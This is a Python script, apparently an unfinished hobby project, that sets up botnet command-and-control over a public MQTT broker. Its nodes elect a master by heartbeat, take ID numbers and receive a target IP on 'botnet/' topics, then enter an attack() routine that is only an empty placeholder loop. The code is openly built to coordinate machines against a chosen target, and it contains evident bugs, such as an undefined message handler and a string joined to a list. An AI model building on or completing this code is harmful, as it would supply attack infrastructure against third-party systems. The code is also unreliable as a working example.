import paho.mqtt.client as mqtt
import time
broker = "iot.eclipse.org"
port = 1883
global received,nodeId,lastId,target
target=0
received=-1
lastId=-555
nodeId=-1

def heartbeat():
    global target
    global lastId
    return str(target)+" "+str(lastId)

def slave():
    global client
    global nodeId
    def on_connect(client, userdata, flags, rc):
        print("Connected with result code "+str(rc))
        client.subscribe("botnet/heartbeat")

    client.on_connect = on_connect
    client.on_message = on_message
    client.on_publish = on_publish
    client.connect(broker,port)
    
    startTime=time.time()
    time.sleep(1)
    while(nodeId==0):
        client.loop(.1)
        if(int((time.time()-startTime)%60%2)==0):
            startTime=time.time()
            if (not isReceived()):
                master()
def master():
    global client
    global nodeId
    global lastId
    def on_connect(client, userdata, flags, rc):
        print("Connected with result code "+str(rc))
        client.subscribe("botnet/target")
        client.subscribe("botnet/lastId")
    def on_message(client, userdata, msg):
        global received
        global lastId
        print(msg.topic+" "+str(msg.payload))
        print(" ")
        received=1
        if(msg.topic=="botnet/lastId" and lastId!=int(msg.payload)):
            lastId=int(msg.payload)
            print("New local last id:",lastId)
        if(msg.topic=="botnet/target"):
            target=str(msg.payload)
            print("New local target:",target)


    client.on_connect = on_connect
    client.on_message = on_message
    client.on_publish = on_publish
    client.connect(broker,port)
    
##    sub a target
##    sub a id
##    publish cada 2 -> ip id

    if(nodeId==-1):
        lastId=0
        nodeId=0
    startTime=time.time()
    while(nodeId==0):
        client.loop(.1)
        if(int((time.time()-startTime)%60%1)==0):
            startTime=time.time()
            time.sleep(1)
            ret= client.publish("botnet/heartbeat",heartbeat())
            
            print("Last id:",lastId)
            print(ret)
            
def isSlave():
    return nodeId==1
def isReceived():
    return received==1
def attack():
    global target
    startTime=time.time()
    while(True):
        ##get
        client.loop(.1)
        if(int((time.time()-startTime)%60)==0):
            print("Checking")
            if(target=="0"):
                break
                return
            startTime=time.time()
        #delay 
def common():
    global client
    def setNodeId(newLastId):
        global nodeId
        nodeId=newLastId
        print("Node id:",newLastId)
        ret= client.publish("botnet/lastId",nodeId)
    def on_connect(client, userdata, flags, rc):
        print("Connected with result code "+str(rc))
        client.subscribe("botnet/heartbeat")
    def on_message(client, userdata, msg):
        global received
        global lastId
        global target
        received=1
        inp=str(msg.payload)[2:-1].split(" ")
        #print("Message",inp)
        topic=msg.topic
        print(topic+" "+inp)
        print(" ")
        
        print(topic,"topico")
        print("laz",lastId,"int(inp[1])",int(inp[1]))
        if(topic=="botnet/heartbeat" and lastId!=int(inp[1])):
            print("lasaidi",inp[1])
            lastId=int(inp[1])
            print("New local last id:",lastId)
        if(msg.topic=="botnet/heartbeat" and inp[0]!="0"): ##Regex for catching ip
           target= inp[0]
           attack()
    client.on_connect = on_connect
    client.on_message = on_message
    client.on_publish = on_publish
    client.connect(broker,port)
    
    startTime=time.time()
    time.sleep(1)
    while(True):
        client.loop(.1)
        #print("Mi id",nodeId)
        if(int((time.time()-startTime)%60%14)==0):
            time.sleep(1)## 15 seconds elapsed
            #print("15 seconds elapsed")
            
            if(nodeId==-1 and isReceived()):   
                setNodeId(lastId+1)
            if(not isReceived()):
                print("isre",isReceived())
                print("No alive nodes, i'll be the master one")
                master()
                #client.loop_stop()
                break
            else:
                received=0
    
    if(isSlave() and not isReceived()):
        master()
def on_publish(client,userdata,result): 
    print("data published \n")
    pass

client = mqtt.Client()
common()

